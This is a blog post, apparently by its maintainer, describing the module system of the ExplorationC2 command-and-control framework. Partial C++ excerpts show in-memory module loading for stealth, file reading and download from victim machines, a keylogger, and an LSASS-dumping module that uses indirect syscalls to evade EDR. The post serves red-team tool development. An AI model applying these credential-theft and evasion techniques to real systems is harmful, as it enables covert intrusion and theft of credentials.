# Part 4 — Modules

This is **Part 4** of a series on **ExplorationC2**, a modular Command-and-Control framework I maintain at [https://github.com/maxDcb/C2TeamServer](https://github.com/maxDcb/C2TeamServer). In this post, I describe the **Modules**.

---

## What Are Modules in ExplorationC2?

Modules in ExplorationC2 are **dynamically loadable components** that extend the functionality of the beacon without requiring changes to its core. They are delivered over the C2 channel and executed directly in memory using the [MemoryModule](https://github.com/maxDcb/MemoryModule) utility and a linux [simpler implementation](https://github.com/maxDcb/C2LinuxImplant/tree/master/libs/libMemoryModuleDumy). This approach allows for a **modular, extensible, and lightweight** architecture.  

Every module as a double implementation for linux and windows, if applicable to the task.

---

## Why Modular Design?

The modular design offers several advantages:

* **Extensibility**: New capabilities can be added without modifying the core beacon.
* **Reduced Footprint**: The beacon remains small and focused on core functionalities, while modules provide additional features as needed.
* **Dynamic Loading**: Modules are loaded at runtime, allowing for on-demand functionality without the need for persistent changes on disk.
* **Flexibility**: Operators can choose which modules to load based on the mission requirements.

This design aligns with the principles of modular software architecture, where systems are divided into smaller, self-contained units that can be independently developed, tested, and maintained.

---

## How Modules Work

Modules are implemented as shared libraries (DLLs on Window, SO on linux) and are loaded into the beacon's process space using the MemoryModule utility. The core beacon communicates with modules through a standardized set of class members, allowing for consistent interaction regardless of the module's specific function.

Here’s an in-depth look at how the **modules** work in this framework:

### 1. **TeamServer Module**

* **TeamServer Modules**: They are loaded at the start of the TeamServer, these are **.so files** (Linux shared objects).

```c++
 // TeamServer module loading
m_logger->debug("TeamServer module directory path {0}", m_teamServerModulesDirectoryPath.c_str());
try
{
    for (const auto& entry : fs::recursive_directory_iterator(m_teamServerModulesDirectoryPath))
    {
        if (fs::is_regular_file(entry.path()) && entry.path().extension() == ".so")
        {
            m_logger->debug("Trying to load {0}", entry.path().c_str());

            void* handle = dlopen(entry.path().c_str(), RTLD_LAZY);

            std::string funcName = entry.path().filename();
            funcName = funcName.substr(3);                        // remove lib
            funcName = funcName.substr(0, funcName.length() - 3); // remove .so
            funcName += "Constructor";                            // add Constructor

            m_logger->debug("Looking for construtor function {0}", funcName);

            constructProc construct = (constructProc)dlsym(handle, funcName.c_str());
            ...
        }
        ...
    }
}

```

TeamServer modules are compiled with specific functionalities:

```c++
// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary of the beacon version, while it is present and used in the TeamServer version
constexpr std::string_view moduleName = "cat";
constexpr unsigned long long moduleHash = djb2(moduleName);

// TeamServer contain the moduleName, where the beacon implementation only get the hash
Cat::Cat()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

// Helper information is only in the TeamServer version
std::string Cat::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Cat Module:\n";
    info += "Read and display the contents of a file from the victim machine.\n";
    info += "Useful for quickly inspecting text files or verifying file contents.\n";
    info += "\nExample:\n";
    info += "- cat c:\\temp\\toto.txt\n";
#endif
    return info;
}

// Message init routine is only present on the TeamServer implementation
int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    if (splitedCmd.size() >= 2 )
    {
        ...

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_inputfile(inputFile);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}
```

### 2. **Beacon Module Loading**

* **Module Transmission**: The **TeamServer** sends the binary data of the **module** (either a `.dll` for Windows or `.so` for Linux) to the **Beacon** using the communication channel in place.
* **Loading**: The **Beacon** uses **MemoryModule** to load the module **directly from memory**, avoiding any need for the module to be written to disk, thus ensuring operational **stealth**.
* **Execution**: The module’s **constructor** is executed as the entry point, initializing the module and preparing it to handle tasks.

```c++
bool Beacon::handleLoadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
    ...
    // Actual dll binary data
    const std::string buffer = c2Message.data();

    HMEMORYMODULE handle = NULL;
    handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());

    // Search for the rentry point that point to a function meant to trigger the constructor (only function exposed)
    constructProc construct;
    construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));

    // Call the constructor and store it for futur use
    ModuleCmd* moduleCmd = construct();
    m_moduleCmd.push_back(std::move(moduleCmd_));
    ...
}
```

Exemple of the exported constructor function:


```c++
#ifdef _WIN32

extern "C" __declspec(dllexport) Cat* CatConstructor() 
{
    return new Cat();
}

#else

extern "C" __attribute__((visibility("default"))) Cat* CatConstructor() 
{
    return new Cat();
}

#endif
```

### 3. **TeamServer Interaction**

After the Beacon successfully loads the module, the **TeamServer** uses its own **implementation** of the module to **craft a message** meant to be processed by the Beacon’s module counterpart. This message might contain instructions and various data.   

```c++
// Message init routine is only present on the TeamServer implementation
int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    if (splitedCmd.size() >= 2 )
    {
        ...

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_inputfile(inputFile);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}

#define ERROR_OPEN_FILE 1 

// Processing, expecting a message crafted using Cat::init
int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(c2Message.inputfile());
    c2RetMessage.set_inputfile(c2Message.inputfile());

    std::string inputFile = c2Message.inputfile();
    std::ifstream input(inputFile, std::ios::binary);
    ...

    return 0;
}

// Error translating routine is only present on the TeamServer implementation
int Cat::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
    }
#endif
    return 0;
}
```

The TeamServer implementation contain strings and error message, as well as the name of the module that are absent of the Beacon's module implementation, for stealth purpuse.

```bash
> strings ./TeamServerModules/libCat.so  | grep -b3 "Failed: Couldn't open file" -i 
2720-|$pH
2725-|$pL
2730-L;l$H
2736:Failed: Couldn't open file
2763-Cat Module:
2775-basic_string::append
2796-Example:

> strings ./WindowsModules/Cat.dll  | grep -b3 "Failed: Couldn't open file" -i
>
```

### 4. **Beacon Module Execution**

Upon receiving the message, the Beacon:
* **processes the message** and dispatch it to the right module 
* The module if loaded **executes the requested task**
* After the task is completed, the module generates a response message, which contains:
  * The **Task results** 
  * Or the **error code**

Some module can run a thread, launch a new process.

### 5. **Module Features**

#### Methodes

Several features help manage module execution and extend the functionality:

* **`followUp`**: Modules can schedule follow-up actions, creating a chain of operations. This function is call TeamServer side. It is use for example in the download module, to create the downloaded file on the TeamServer machine at reception of a sucessfull download module message.

```c++
// followUp executed TeamServer side at reception of C2Message from download module
int Download::followUp(const C2Message &c2RetMessage)
{
    // check if there is an error
    if(c2RetMessage.errorCode()==-1)
    {
        std::string args = c2RetMessage.args();
        std::string outputFile = c2RetMessage.outputfile();

        // upon execution of followUp, we fill the downloaded file with data received for the beacon Download::process results
        std::ofstream output(outputFile, std::ios::binary | std::ios::app);
        const std::string buffer = c2RetMessage.data();
        output << buffer;
        output.close();
        
    }

    return 0;
}
```

* **`errorCodeToMsg`**: Internal error codes are mapped to **human-readable error messages**, ensuring that the operator can easily understand any issues that occured during module execution. This feature ensure that the beacon implmentation doesn't leak information about it's functioning without loosing **operational clarity**.

* **`recurringExec`**: Some modules are designed for **periodic execution**. The `recurringExec` feature allows these modules to run at **regular intervals** without operator intervention. This is useful for ongoing tasks such as **data collection**, **persistent monitoring**, or **background operations**. It is use for example in the keylogger module, to retrive logged keys:

```c++
// recurringExec executed at each beacon wake up
int KeyLogger::recurringExec(C2Message& c2RetMessage) 
{
    std::string output;
    dumpKeys(output);

    c2RetMessage.set_instruction(std::to_string(getHash()));
    c2RetMessage.set_data(output);
    
    return 1;
}

int KeyLogger::followUp(const C2Message &c2RetMessage)
{
    m_saveKeyStrock+=c2RetMessage.data();

    return 0;
}
```

These features allow for **customizable** and **automated** operations within ExplorationC2.  

#### Stealth

The module base line: `C2Core/modules/ModuleCmd` include some helper implementation like Hardware breakpoint and indirect syscall (inspired by [SysWhispers3](https://github.com/klezVirus/SysWhispers3)) as well as diverse utilitary functions. 

It help the development process for stealthy modules like the [MiniDump](https://github.com/maxDcb/C2Core/blob/master/modules/MiniDump/MiniDump.cpp) one, capable to bypassing advance EDR for LSASS dumping.

```c++
#include <syscall.hpp>

int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    ...
    // Get process handle with NtOpenProcess
    HANDLE lsassHandle=NULL;
    CLIENT_ID client_id = {0};
    client_id.UniqueProcess = (HANDLE)dwPid;
    client_id.UniqueThread = 0;
    OBJECT_ATTRIBUTES objAttr = {0};
    // Indirect syscall implementation for NtOpenProcess 
    Sw3NtOpenProcess_(&lsassHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &client_id);

    // Standard implementation of OpenProcess
    // HANDLE lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
    if(lsassHandle==NULL)
    {
        ...
    }
    ...
}
```

### 6. **Module Unloading**

After the module has completed its task, it can be **unloaded from memory**. This function can be usfull if modification are needed on the module to achive the task.

---

## The Module Template

To facilitate the creation of new modules, a [ModuleTemplate](https://github.com/maxDcb/C2Core/tree/master/modules/ModuleTemplate) is provided. This template includes:

* A basic structure for the module.
* Sample code demonstrating how to handle incoming messages.

By using this template, developers can quickly create new modules that work with the framework's standards and integrate seamlessly with the existing system.  
It is also usfull for AI generated modules, as agents like codex work best with Template. SOme of the modules like the [whoami](https://github.com/maxDcb/C2Core/blob/master/modules/Whoami/Whoami.cpp) where generated by codex.  

---

## Existing Modules

The [ModuleCmd](https://github.com/maxDcb/C2Core/tree/master/modules/) directory contains several modules.

These modules serve as practical examples of how to implement functionality within the modular framework.

---

## Conclusion

With this, I conclude my series on building a modern C2 framework. Writing this series has been a valuable exercise in reflecting on the design and decisions behind the **ExplorationC2** project. It has allowed me to consolidate the reasoning behind each architectural choice and explain why certain approaches were taken. By sharing these insights, I hope to provide a clearer understanding of the technical challenges faced and the solutions implemented, as well as the modular, flexible nature of the framework that allows for dynamic extensibility.

This project has been both a learning experience and an opportunity to experiment with techniques in **Command and Control (C2)** development. Moving forward, I’m excited to continue iterating on this framework, adding new capabilities, and refining existing features to adapt to an ever-changing security landscape.

Thank you for following along, and I hope you found this series insightful. If you have any questions or thoughts, feel free to reach out or explore the project further on [GitHub](https://github.com/maxDcb/C2TeamServer).
